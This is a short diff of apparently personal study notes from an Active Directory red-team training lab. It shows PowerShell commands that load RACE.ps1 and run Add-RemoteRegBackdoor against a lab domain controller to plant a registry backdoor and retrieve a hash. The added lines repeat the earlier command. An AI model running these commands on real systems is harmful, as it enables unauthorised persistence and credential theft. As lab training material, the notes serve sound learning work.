@@ -568,3 +568,11 @@ So open a session, import race.ps1 and launche te command.
 ```powershell
 Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student115 -Verbose
 ```
+![[Pasted image 20231025150802.png]]
+and retrieve the hash
+```powershell
+. C:\AD\Tools\RACE.ps1
+```
+```powershell
+Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student115 -Verbose
+```
